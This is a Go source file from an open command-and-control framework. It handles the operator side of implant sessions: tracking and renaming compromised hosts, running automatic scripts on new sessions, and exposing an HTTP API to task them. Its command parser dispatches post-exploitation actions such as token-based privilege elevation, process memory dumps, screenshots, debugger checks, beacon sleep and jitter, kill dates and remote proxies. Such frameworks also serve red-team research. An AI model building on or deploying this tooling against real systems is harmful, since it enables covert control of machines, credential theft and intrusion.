// Copyright (C) 2020 - 2024 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package cirrus

import (
	"context"
	"io"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/PurpleSec/escape"
	"github.com/PurpleSec/routex"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const msgNoSession = "session was not found"

var (
	errEmptyFilter    = xerr.New("invalid or empty filter")
	errInvalidSleep   = xerr.New("invalid time interval value")
	errInvalidJitter  = xerr.New("invalid jitter value")
	errUnknownCommand = xerr.New("invalid or unrecognized command")
)

type session struct {
	s *c2.Session
	j []uint16
	sync.RWMutex
	h    uint32
	name string
}
type sessionManager struct {
	*Cirrus
	e     map[string]*session
	hw    map[string]string
	names map[string]*session
	sync.RWMutex
}

func (s *session) ID() string {
	if len(s.name) > 0 {
		return s.name
	}
	return s.s.ID.String()
}
func (s *session) isNamed() bool {
	return len(s.name) > 0
}
func (s *sessionManager) verifyMappings() {
	for k, v := range s.hw {
		if len(v) <= 58 {
			continue
		}
		s.log.Warning(`[cirrus/session] Truncating invalid Session mapping for "%s" to 58 chars (was %d chars)`, k, len(v))
		s.hw[k] = v[:58]
	}
}
func (s *session) JSON(w io.Writer) error {
	if _, err := w.Write([]byte(`{"id":` + escape.JSON(s.s.ID.String()) + `,"hash":` + util.Uitoa(uint64(s.h)))); err != nil {
		return err
	}
	if _, err := w.Write([]byte(`,"name":` + escape.JSON(s.name) + `,"session":`)); err != nil {
		return err
	}
	if err := s.s.JSON(w); err != nil {
		return err
	}
	if _, err := w.Write([]byte{'}'}); err != nil {
		return err
	}
	return nil
}
func (c *Cirrus) newSession(s *c2.Session) {
	if s == nil || s.ID.Empty() {
		return
	}
	n := s.ID.String()
	c.sessions.Lock()
	x, ok := c.sessions.e[n]
	if !ok {
		x = &session{s: s, h: s.ID.Hash()}
		k := x.s.ID.Signature()
		if h := c.sessions.matchHwName(k); len(h) > 0 {
			x.name = h
			c.sessions.names[h] = x
			c.log.Debug(`[cirrus/session] Found Hardware ID mapping for "%s" adding new Session as "%s"!`, k, h)
		}
		c.sessions.e[n] = x
	} else {
		c.log.Warning(`[cirrus/session] Received new Session signal for existsing Session "%s"!`, n)
		// NOTE(dij): Should we just return here?
	}
	c.sessions.Unlock()
	c.sessions.events.publishSessionNew(x.ID())
	s.Shutdown = c.shutdownSession
	c.log.Debug(`[cirrus/session] Added new Session "%s" (0x%X)!`, n, x.h)
	c.sessionEvent(s, sSessionNew)
	l := s.Listener()
	if l == nil {
		return
	}
	v := strings.ToLower(l.String())
	c.listeners.RLock()
	z, ok := c.listeners.e[v]
	if c.listeners.RUnlock(); !ok || len(z.s) == 0 {
		return
	}
	c.log.Debug(`[cirrus/session] Running auto script "%s" on "%s".`, n, z.s)
	q, _ := c.script(z.s)
	q.Lock()
	j, err := s.Tasklet(q.s)
	if q.Unlock(); err != nil {
		return
	}
	c.watchJob(x, j, "auto script "+z.s)
}
func (c *Cirrus) session(n string) *session {
	c.log.Debug(`[cirrus/session] Requested Session "%s"..`, n)
	if len(n) == 0 || !isValidName(n) {
		return nil
	}
	c.sessions.RLock()
	v := c.sessionNoLock(n)
	c.sessions.RUnlock()
	return v
}
func (s *sessionManager) clearJobs(x *session) {
	if x.Lock(); len(x.j) == 0 {
		x.Unlock()
		return
	}
	s.jobs.Lock()
	for i := range x.j {
		var (
			h     = uint64(x.h)<<16 | uint64(x.j[i])
			j, ok = s.jobs.e[h]
		)
		if !ok {
			continue
		}
		if s.removeJob(j); j.Result != nil {
			j.Result.Clear()
			j.Result = nil
		}
		s.jobs.e[h], j = nil, nil
		delete(s.jobs.e, h)
	}
	s.jobs.Unlock()
	x.j = nil
	x.Unlock()
}
func (c *Cirrus) shutdownSession(s *c2.Session) {
	if s == nil || s.ID.Empty() {
		return
	}
	n := s.ID.String()
	c.sessions.RLock()
	x, ok := c.sessions.e[n]
	if c.sessions.RUnlock(); !ok {
		return
	}
	c.log.Debug(`[cirrus/session] Removing Session "%s" (0x%X)!`, n, x.h)
	c.sessions.clearJobs(x)
	c.sessions.Lock()
	c.sessions.e[n] = nil
	if len(x.name) > 0 {
		c.sessions.names[x.name] = nil
		delete(c.sessions.names, x.name)
	}
	delete(c.sessions.e, n)
	c.sessions.Unlock()
	c.events.publishSessionDelete(x.ID())
	c.sessionEvent(s, sSessionDelete)
}
func (c *Cirrus) sessionNoLock(n string) *session {
	if f, ok := c.sessions.names[strings.ToLower(n)]; ok {
		return f
	}
	return c.sessions.e[strings.ToUpper(n)]
}
func (s *sessionManager) matchHwName(h string) string {
	v, ok := s.hw[h]
	if !ok || len(v) == 0 {
		return ""
	}
	for i := 0; i < 64; i++ {
		n := strings.ToLower(v + "-" + util.Uitoa16(uint64(util.FastRandN(0xFFFF))))
		if _, ok = s.names[n]; !ok {
			return n
		}
	}
	return ""
}
func syscallPacket(c, a string, f *filter.Filter) (*com.Packet, error) {
	if len(c) == 0 {
		return nil, errUnknownCommand
	}
	if len(a) == 0 {
		return syscallSinglePacket(c, f)
	}
	switch a = strings.TrimSpace(a); strings.ToLower(c) {
	case "ls":
		if a == "-al" {
			return task.Ls(""), nil
		}
		return task.Ls(a), nil
	case "cd":
		return task.Cwd(a), nil
	case "wait":
		d, err := parseDuration(a, false)
		if err != nil {
			return nil, err
		}
		return task.Wait(d), nil
	case "chan":
		return nil, nil
	case "sleep":
		d, j, err := parseSleep(a)
		if err != nil {
			return nil, err
		}
		return task.Duration(d, j), nil
	case "jitter":
		j, err := parseJitter(a)
		if err != nil {
			return nil, err
		}
		return task.Jitter(j), nil
	case "elevate":
		if i, err := strconv.ParseUint(a, 10, 32); err == nil && i > 0 {
			return task.Elevate(&filter.Filter{PID: uint32(i)}), nil
		}
		return task.Elevate(filter.I(a)), nil
	case "untrust":
		if i, err := strconv.ParseUint(a, 10, 32); err == nil && i > 0 {
			return task.UnTrust(&filter.Filter{PID: uint32(i)}), nil
		}
		return task.UnTrust(filter.I(a)), nil
	case "procdump":
		if i, err := strconv.ParseUint(a, 10, 32); err == nil && i > 0 {
			return task.ProcessDump(&filter.Filter{PID: uint32(i)}), nil
		}
		return task.ProcessDump(filter.I(a)), nil
	case "procname":
		return task.ProcessName(a), nil
	case "killdate":
		if a == "0" || a == "00:00" {
			return task.KillDate(time.Time{}), nil
		}
		t, err := parseTime(a)
		if err != nil {
			return nil, err
		}
		return task.KillDate(t), nil
	}
	return nil, errUnknownCommand
}
func syscallSinglePacket(c string, f *filter.Filter) (*com.Packet, error) {
	switch strings.ToLower(c) {
	case "ls":
		return task.Ls(""), nil
	case "ps":
		return task.ProcessList(), nil
	case "pwd":
		return task.Pwd(), nil
	case "chan":
		return nil, nil
	case "whoami":
		return task.Whoami(), nil
	case "mounts":
		return task.Mounts(), nil
	case "elevate":
		if f.Empty() {
			return nil, errEmptyFilter
		}
		return task.Elevate(f), nil
	case "refresh":
		return task.Refresh(), nil
	case "untrust":
		if f.Empty() {
			return nil, errEmptyFilter
		}
		return task.UnTrust(f), nil
	case "rev2self":
		return task.RevToSelf(), nil
	case "killdate":
		return task.KillDate(time.Time{}), nil
	case "procdump":
		if f.Empty() {
			return nil, errEmptyFilter
		}
		return task.ProcessDump(f), nil
	case "screenshot":
		return task.ScreenShot(), nil
	case "check_debug":
		return task.IsDebugged(), nil
	}
	return nil, errUnknownCommand
}
func (s *session) syscall(c, a string, f *filter.Filter) (*c2.Job, error) {
	n, err := syscallPacket(c, a, f)
	if err != nil {
		return nil, err
	}
	if n == nil {
		s.s.SetChannel(isTrue(a))
		return nil, nil
	}
	return s.s.Task(n)
}
func (s *sessionManager) updateName(n string, x *session, m, l bool) (string, bool) {
	if len(n) == 0 {
		// Delete only.
		if x.name = ""; l {
			s.Lock()
		}
		if s.e[x.name] = nil; m {
			// If mapping is true, unset the mapping
			delete(s.hw, x.s.ID.Signature())
		}
		if delete(s.e, x.name); l {
			s.Unlock()
		}
		return "", true
	}
	// If setting, we'll first do a check to verify
	v := strings.ToLower(strings.TrimSpace(n))
	if len(v) > 58 {
		v = v[:58]
	}
	if l {
		s.RLock()
	}
	_, ok := s.names[v]
	if l {
		s.RUnlock()
	}
	if ok {
		// Already exists, don't set.
		return "", false
	}
	// Cache old name
	o := x.name
	if l {
		s.Lock()
	}
	// If old name exists, unset the mapping first.
	if len(x.name) > 0 {
		s.e[x.name] = nil
		if delete(s.e, x.name); m {
			// If we're setting a mapping, we need to delete the old one first.
			delete(s.hw, x.s.ID.Signature())
		}
	}
	if x.name = v; m {
		h := x.s.ID.Signature()
		s.log.Debug(`[cirrus/session] Adding mapping "%s" for Hardware ID "%s".`, v, h)
		s.hw[h] = v
	}
	if s.names[v] = x; l {
		s.Unlock()
	}
	return o, true
}
func (s *sessionManager) autoUpdateName(x *session, prefix string, f, m, l bool) (string, bool) {
	if !f && x.isNamed() {
		return "", true
	}
	v := x.s.Device.Hostname
	if len(v)+len(prefix) < 4 {
		return "", true
	}
	if i := strings.IndexByte(v, '.'); i > 0 {
		v = v[:i]
	}
	if len(prefix) > 0 {
		v = prefix + "-" + v
	}
	if len(v) > 58 {
		v = v[:58]
	}
	if _, u := s.updateName(v, x, m, l); u {
		return v, true
	}
	return "", false
}
func (s *sessionManager) httpSessionGet(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	w.WriteHeader(http.StatusOK)
	x.JSON(w)
}
func (s *sessionManager) httpSessionsGet(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	var h string
	f := r.URL.Query()
	if len(f) > 0 {
		h = f.Get("hw")
	}
	w.WriteHeader(http.StatusOK)
	w.Write([]byte{'['})
	if s.RLock(); len(s.e) > 0 {
		var n int
		for _, v := range s.e {
			if len(h) > 0 && v.s.ID.Signature() != h {
				continue
			}
			if n > 0 {
				w.Write([]byte{','})
			}
			v.JSON(w)
			n++
		}
	}
	s.RUnlock()
	w.Write([]byte{']'})
}
func (s *sessionManager) httpSessionDelete(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	var v bool
	if c, err := r.Content(); err == nil && len(c) > 0 {
		v = c.BoolDefault("shutdown", false)
	}
	s.s.Remove(x.s.ID, v)
	w.WriteHeader(http.StatusOK)
}
func (s *sessionManager) httpSessionRename(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	c, err := r.Content()
	if err != nil {
		writeError(http.StatusBadRequest, err.Error(), w, r)
		return
	}
	n := c.StringDefault("name", "")
	if len(n) > 0 && !isValidName(n) {
		writeError(http.StatusBadRequest, "name is invalid", w, r)
		return
	}
	if len(n) > 0 && len(n) < 4 {
		writeError(http.StatusBadRequest, "name is too short (min 4 chars)", w, r)
		return
	}
	if len(n) > 58 {
		writeError(http.StatusBadRequest, "name is too long (max 58 chars)", w, r)
		return
	}
	o, ok := s.updateName(n, x, c.BoolDefault("map", true), true)
	if !ok {
		writeError(http.StatusConflict, `name "`+n+`" already in use`, w, r)
		return
	}
	if len(o) == 0 {
		s.events.publishSessionUpdate(x.s.ID.String())
	} else {
		s.events.publishSessionUpdate(o)
	}
	w.WriteHeader(http.StatusOK)
	x.JSON(w)
}
func (s *sessionManager) httpSessionAutoName(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	var (
		f, m bool
		p    string
	)
	if c, err := r.Content(); err == nil {
		f, m = c.BoolDefault("force", false), c.BoolDefault("map", false)
		p = c.StringDefault("prefix", "")
	}
	switch o, ok := s.autoUpdateName(x, p, f, m, true); {
	case !ok:
		writeError(http.StatusConflict, "auto name already in use", w, r)
	case len(o) == 0:
		w.Write([]byte(`{"updated":false}`))
	default:
		s.events.publishSessionUpdate(o)
		w.Write([]byte(`{"updated":true,"new":` + escape.JSON(o) + `}`))
	}
}
func (s *sessionManager) httpSessionProxyDelete(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	n := r.Values.StringDefault("name", "")
	if !isValidName(n) {
		writeError(http.StatusBadRequest, `value "name" cannot be invalid`, w, r)
		return
	}
	j, err := x.s.Task(task.ProxyRemove(strings.ToLower(n)))
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		s.log.Warning(`[cirrus/http] httpSessionProxyDelete(): Error tasking Session "%s": %s!`, n, err.Error())
		return
	}
	s.watchJob(x, j, "proxy delete "+n)
	w.WriteHeader(http.StatusOK)
	j.JSON(w)
}
func (s *sessionManager) httpSessionsDelete(_ context.Context, w http.ResponseWriter, r *routex.Request, v taskSessionsDelete) {
	if w.WriteHeader(http.StatusOK); len(v.Sessions) == 0 {
		return
	}
	s.RLock()
	for _, n := range v.Sessions {
		if len(n) == 0 || !isValidName(n) {
			continue
		}
		if x := s.sessionNoLock(n); x != nil {
			s.s.Remove(x.s.ID, v.Shutdown)
		}
	}
	s.RUnlock()
}
func (s *sessionManager) httpSessionProxyPutPost(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	n := r.Values.StringDefault("name", "")
	if !isValidName(n) {
		writeError(http.StatusBadRequest, `value "name" cannot be invalid`, w, r)
		return
	}
	var (
		b    = c.StringDefault("address", "")
		p, _ = s.profile(c.StringDefault("profile", ""))
	)
	if len(b) == 0 {
		writeError(http.StatusBadRequest, `value "address" cannot be empty`, w, r)
		return
	}
	var (
		j   *c2.Job
		err error
	)
	if r.IsPost() {
		j, err = x.s.Task(task.ProxyReplace(strings.ToLower(n), b, p))
	} else {
		j, err = x.s.Task(task.Proxy(strings.ToLower(n), b, p))
	}
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		s.log.Warning(`[cirrus/http] httpSessionProxyPutPost(): Error tasking Session "%s": %s!`, n, err.Error())
		return
	}
	if r.IsPost() {
		s.watchJob(x, j, "proxy mod "+n+" "+b+" "+p.String())
		w.WriteHeader(http.StatusOK)
	} else {
		s.watchJob(x, j, "proxy add "+n+" "+b+" "+p.String())
		w.WriteHeader(http.StatusCreated)
	}
	j.JSON(w)
}
func (s *sessionManager) httpSessionsAutoName(_ context.Context, w http.ResponseWriter, r *routex.Request, v taskSessionsRename) {
	if w.WriteHeader(http.StatusOK); len(v.Sessions) == 0 {
		return
	}
	i := 0
	w.Write([]byte(`{"changed":{`))
	s.RLock()
	for _, n := range v.Sessions {
		if len(n) == 0 || !isValidName(n) {
			continue
		}
		if x := s.sessionNoLock(n); x != nil {
			u, ok := s.autoUpdateName(x, v.Prefix, v.Force, v.Map, false)
			if !ok || len(u) == 0 {
				continue
			}
			if s.events.publishSessionUpdate(u); i > 0 {
				w.Write([]byte(","))
			}
			w.Write([]byte(escape.JSON(n) + `:` + escape.JSON(u)))
			i++
		}
	}
	s.RUnlock()
	w.Write([]byte("}}"))
}
